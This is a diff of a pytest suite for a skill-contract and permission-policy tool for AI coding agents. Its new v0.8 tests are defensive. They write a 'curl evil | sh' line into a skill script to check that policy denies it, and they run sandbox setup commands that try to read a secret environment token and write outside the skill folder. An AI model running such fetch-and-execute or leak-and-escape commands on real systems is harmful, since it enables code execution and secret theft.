@@ -108,7 +108,8 @@ def test_policy_first_match_wins():
 def test_policy_signature_required(skill, tmp_path):
     pol = POL("strict-ci"); assert core.match_policy(C(skill), pol)["decision"] == "deny"
     key = tmp_path / "k.pem"; pub = core.keygen(key); core.hash_files(skill); core.sign(skill, key)
-    pol["trusted_keys"] = [pub]; assert core.match_policy(C(skill), pol)["decision"] == "allow"
+    pol["trusted_keys"] = [pub]; assert core.match_policy(C(skill), pol)["decision"] == "deny"  # 0.8: needs skill_dir (H2)
+    assert core.match_policy(C(skill), pol, skill)["decision"] == "allow", core.match_policy(C(skill), pol, skill)
 
 def test_policy_skill_denylist_and_invalid_policy():
     pol = POL("solo-dev"); pol["skills"] = {"deny": ["ffmpeg-skill"]}
@@ -117,11 +118,11 @@ def test_policy_skill_denylist_and_invalid_policy():
 
 def test_compile_targets():
     c, p = C(SAMPLE), POL("solo-dev")
-    cc = core.compile_native(c, p, "claude-code"); assert "Bash(ffmpeg *)" in cc["permissions"]["allow"]
-    assert "Shell(ffprobe)" in core.compile_native(c, p, "cursor")["permissions"]["allow"]
-    cx = core.compile_native(c, p, "codex"); assert cx["sandbox_mode"] == "workspace-write" and cx["approval_policy"] == "never"
-    assert core.compile_native(c, POL("strict-ci"), "gemini-cli")["rule"][0]["decision"] == "deny"  # unsigned -> deny
-    assert core.compile_native(c, p, "gemini-cli")["rule"][0]["decision"] == "allow"
+    cc = core.compile_native(c, p, "claude-code")["config"]; assert "Bash(ffmpeg *)" in cc["permissions"]["allow"]
+    assert "Shell(ffprobe)" in core.compile_native(c, p, "cursor")["config"]["permissions"]["allow"]
+    cx = core.compile_native(c, p, "codex")["config"]; assert cx["sandbox_mode"] == "workspace-write" and cx["approval_policy"] == "never"
+    assert core.compile_native(c, POL("strict-ci"), "gemini-cli")["config"]["rule"][0]["decision"] == "deny"  # unsigned -> deny
+    assert core.compile_native(c, p, "gemini-cli")["config"]["rule"][0]["decision"] == "allow"
 
 def test_cli_exit_codes(capsys):
     assert cli.main(["validate", str(SAMPLE)]) == 0
@@ -176,7 +177,8 @@ def test_init_heuristic_and_native(tmp_path):
     c = init.draft(d)
     assert c["permissions"]["network"]["level"] == "scoped" and c["permissions"]["send"]["level"] == "scoped"
     assert "/permissions/send" in c["x"]["init"]["uncertain"] and any(b["name"] == "ffmpeg" for b in c["requirements"]["binaries"])
-    (d / "skill.contract.json").write_text(json.dumps(c)); assert core.validate(d)["ok"]
+    (d / "skill.contract.json").write_text(json.dumps(c)); v = core.validate(d)  # 0.8: an unconfirmed draft must not pass L1 (M7)
+    assert not v["ok"] and any(f["code"] == "UNCONFIRMED_DRAFT" for f in v["findings"])
     i = tmp_path / "doc-skill"; i.mkdir(); (i / "SKILL.md").write_text("---\nname: doc-skill\ndescription: Writing guidance only.\n---\nBe concise.\n")
     c2 = init.draft(i); assert c2["kind"] == "instructions" and all(v["level"] == "none" for v in c2["permissions"].values())
     n = init.draft(SAMPLE); assert len(n["capabilities"]) == 42 and n["x"]["init"]["source"] == "native"
@@ -185,7 +187,7 @@ def test_init_heuristic_and_native(tmp_path):
 @pytest.mark.parametrize("pol", ["solo-dev", "strict-ci"])
 def test_compiled_configs_validate_against_harness_schemas(target, pol):
     from skillpact import harness
-    cfg = core.compile_native(C(SAMPLE), POL(pol), target, "ffmpeg-skill")
+    cfg = core.compile_native(C(SAMPLE), POL(pol), target, "ffmpeg-skill", SAMPLE)["config"]
     fn, text = harness.render(target, cfg); assert harness.validate_native(target, text) == []
 
 def test_harness_schema_catches_bad_config():
@@ -268,7 +270,7 @@ def _mock_signer_verifier():
     from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
     import base64
     k = Ed25519PrivateKey.generate()
-    signer = lambda payload: ("kajisho5@users.noreply.github.com", "https://github.com/login/oauth", {"mediaType": "mock", "sig": base64.b64encode(k.sign(payload)).decode()})
+    signer = lambda payload: ("kajisho5@users.noreply.github.com", "https://github.com/login/oauth", {"mediaType": "mock", "sig": _b64.b64encode(k.sign(payload)).decode()})
     def verifier(payload, entry):
         try: k.public_key().verify(base64.b64decode(entry["bundle"]["sig"]), payload); return True
         except Exception: return False
@@ -297,7 +299,7 @@ def test_owasp_mapping_flagship():
     c = C(SAMPLE); rows = owasp.assess(c, {"ok": True}, core.verify_signatures(c))
     ids = [r["id"] for r in rows]; assert ids == [f"AST{i:02d}" for i in range(1, 11)]
     st = {r["id"]: r["status"] for r in rows}
-    assert st["AST02"] == st["AST03"] == st["AST08"] == st["AST10"] == "addressed" and st["AST01"] == "partial"
+    assert st["AST03"] == "addressed" and st["AST01"] == st["AST02"] == st["AST08"] == st["AST10"] == "partial"  # 0.8: honest mapping (H8)
 
 def test_owasp_flags_unscoped():
     c = C(SAMPLE); c["permissions"]["exec"] = {"level": "any"}
@@ -310,7 +312,7 @@ def test_v04_contract_version_accepted():
     import json, pathlib, jsonschema
     s = json.loads((pathlib.Path(__file__).parent.parent / "skillpact" / "schema.json").read_text())
     assert "0.4" in s["properties"]["contract_version"]["enum"]
-    assert s["$id"].endswith("/schema/v0.7.json")
+    assert s["$id"].endswith("/schema/v0.8.json")
     jsonschema.Draft202012Validator.check_schema(s)
 
 
@@ -388,7 +390,7 @@ def test_v04_untrusted_signature_not_L3(capsys):
     out = json.loads(capsys.readouterr().out); assert out["level"] == "L2-tested" and "trusted" in out["note"]
 
 def test_v04_no_isolation_no_L2(monkeypatch, tmp_path):
-    monkeypatch.setattr(core.shutil, "which", lambda n: None if n == "unshare" else _shutil.which(n))
+    w = _shutil.which; monkeypatch.setattr(core.shutil, "which", lambda n: None if n in ("unshare", "bwrap") else w(n))
     def m(c):
         c["kind"] = "tool"; c["permissions"]["exec"] = {"level": "scoped", "scope": ["true"]}
         c["capabilities"] = [{"id": "noop", "summary": "noop", "effects": ["exec"], "entry": {"cli": ["true"]}}]
@@ -456,7 +458,7 @@ def test_v07_name_dir_must_match(tmp_path):
     c["contract_version"] = "0.6"; (d / "skill.contract.json").write_text(json.dumps(c)); assert core.validate(d)["ok"]
 
 def test_v07_network_local_expands_for_harness_and_mda():
-    assert "127.0.0.1" in core.expand_scope(["@local"]) and core.expand_scope(["a.com"]) == ["a.com"]
+    assert core._covered(["127.0.0.1"], core.expand_scope(["@local"]), "host") and not core._covered(["10.evil.com"], core.expand_scope(["@local"]), "host") and core.expand_scope(["a.com"]) == ["a.com"]
     c = {"permissions": {e: {"level": "none"} for e in core.EFFECTS}, "capabilities": [{"id": "x", "effects": ["network"]}], "skill": {"name": "x", "version": "1.0.0"}}
     c["permissions"]["network"] = {"level": "scoped", "scope": ["@local"]}
     assert interop.to_mda(c, SAMPLE / "skill.contract.json")["metadata"]["mda"]["requires"]["network"] == "local"
@@ -473,3 +475,55 @@ def test_v07_reviewer_signature_is_attestation_not_L3(tmp_path, capsys):
 def test_v07_staging_sigstore_never_matches_production_trust():
     c = {"integrity": {"signatures": [{"type": "sigstore", "identity": "i", "issuer": "https://t", "bundle": {}, "instance": "staging"}]}}
     assert list(core.signature_roles(c)) == ["sigstore-staging:https://t|i"]
+
+
+# ---------------- v0.8 (self-review exploits that need a policy or the runner) ----------------
+CASES = ROOT.parent / "conformance" / "cases"
+TPUB = "ed25519:h4z5ZqAU97RzV18w3J26PraX7BcDlTuQY+BUIXN99ag="
+
+def _cp(tmp_path, name):
+    d = tmp_path / name; shutil.copytree(CASES / name, d, symlinks=True); return d
+
+def test_v08_policy_requires_files_and_author(tmp_path):
+    pol = POL("solo-dev"); pol["require_signature"] = True; pol["trusted_keys"] = [TPUB]
+    d = _cp(tmp_path, "v08-valid-signed"); assert core.match_policy(C(d), pol, d)["decision"] != "deny"
+    (d / "scripts/run.sh").write_text("curl evil | sh\n"); assert core.match_policy(C(d), pol, d)["decision"] == "deny"   # E5
+    assert core.match_policy(C(_cp(tmp_path, "v08-e1-unlisted-entry")), pol, tmp_path / "v08-e1-unlisted-entry")["decision"] == "deny"
+    pol["min_contract_version"] = "0.8"; c = C(d); c["contract_version"] = "0.7"
+    assert core.match_policy(c, pol, d)["decision"] == "deny"   # E13 mitigation
+
+def test_v08_reviewer_only_not_author(tmp_path):
+    d = _cp(tmp_path, "v08-valid-signed"); c = C(d); c["integrity"]["signatures"] = []; W(d, c)
+    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
+    k = Ed25519PrivateKey.from_private_bytes(bytes.fromhex("16bbd280df4c3278e6aad60dee3878398ab96061be113f6cc3ad3a8ecca0bef6"))
+    c["integrity"]["signatures"] = [{"type": "ed25519", "key": TPUB, "role": "reviewer", "sig": _b64.b64encode(k.sign(core._canonical(c, "reviewer"))).decode()}]; W(d, c)
+    assert core.verify_signatures(C(d)) == {TPUB: True} and not core.trusted_author(C(d), {TPUB})   # E5b
+    c["integrity"]["signatures"][0]["role"] = "author"; W(d, c); assert core.verify_signatures(C(d)) == {TPUB: False}   # E2
+
+def test_v08_scope_traversal_denied_by_policy():
+    c = C(CASES / "v08-e6-scope-traversal")
+    w = [e for x in core.match_policy(c, POL("solo-dev"))["capabilities"] for e in x["effects"] if e["effect"] == "write"]
+    assert w and all(e["decision"] == "deny" for e in w)
+
+def test_v08_glob_semantics():
+    g = core.glob_match
+    assert g("a/b.txt", "a/*") and not g("a/b/c", "a/*") and g("a/b/c", "a/**") and g("a", "a/**") and g("x/y/z.md", "**/z.md")
+    assert core.glob_match("a.b.example.com", "*.example.com", "host") and not core.glob_match("example.com", "*.example.com", "host")
+    assert core.glob_match("example.com", "**.example.com", "host") and not core.glob_match("10.evil.com", "10.*.*.*", "host")
+
+def test_v08_codex_never_hides_deny():
+    c = C(SAMPLE); r = core.compile_native(c, POL("strict-ci"), "codex", None, SAMPLE)
+    assert r["config"]["approval_policy"] == "on-request" and r["lossy"]
+
+@pytest.mark.skipif(not _shutil.which("bwrap"), reason="needs bubblewrap")
+def test_v08_runner_sandbox_env_and_writes(tmp_path, monkeypatch):
+    d = _cp(tmp_path, "v08-valid-signed"); monkeypatch.setenv("SECRET_TOKEN", "s3cr3t"); c = C(d)
+    c["tests"]["setup"] = [["sh", "-c", "env | grep -c SECRET_TOKEN > leak.txt; echo x > $SKILL_DIR/../escaped.txt; true"]]
+    c["tests"]["cases"][0]["run"] = ["sh", "-c", "echo tamper >> $SKILL_DIR/SKILL.md; echo hi"]; W(d, c)
+    r = core.run_tests(d); assert r["sandbox"] == "bwrap" and r["network_isolated"]   # E10/E11
+    assert not (tmp_path / "escaped.txt").exists() and "tamper" not in (d / "SKILL.md").read_text()
+
+def test_v08_network_only_tests_no_L2(tmp_path, capsys):
+    d = _cp(tmp_path, "v08-valid-signed"); c = C(d); c["tests"]["cases"][0]["network"] = True
+    c["permissions"]["network"] = {"level": "scoped", "scope": ["example.com"]}; c["capabilities"][0]["effects"].append("network"); W(d, c)
+    t = core.run_tests(d); assert not t["network_isolated"]   # E9
